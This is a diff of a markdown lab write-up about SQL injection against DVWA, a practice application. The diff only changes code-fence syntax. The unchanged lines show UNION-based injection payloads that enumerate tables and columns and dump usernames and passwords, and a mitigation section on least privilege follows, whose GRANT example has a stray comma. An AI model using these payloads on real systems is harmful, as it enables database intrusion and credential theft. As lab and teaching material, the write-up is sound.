@@ -78,19 +78,19 @@ With the below command, the tester queried all available databases.
 ![](/assets/sql/dataBases.png)  
 
 Next, the tester targeted the table names from the dvwa database to figure out that there was a users table to target.
-```{bash}
+```bash
 ' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'dvwa' #
 ```
 ![](/assets/sql/table_name.png)  
 
 Next, the tester figured out  the column names from the dvwa users table.
 
-```{bash}
+```bash
 ' UNION SELECT null, column_name FROM information_schema.columns WHERE table_schema = 'dvwa' AND table_name = 'users' #
 ```
 As a result, the tester retrieved the username and password from the data base.
 
-```{bash}
+```bash
 ' UNION SELECT user, password FROM dvwa.users #
 
 ```
@@ -187,7 +187,7 @@ $stmt->execute();
 ### Principle of Least Privilege
 
 Ensure that database users have the minimum required privileges necessary for their operations. Avoid granting excessive permissions to user accounts.
-```{bash}
+```bash
 mysql -u root -p root
 GRANT SELECT, INSERT, UPDATE, DELETE, ON mydatabase.* TO 'app'@'localhost';
 FLUSH PRIVILEGES;
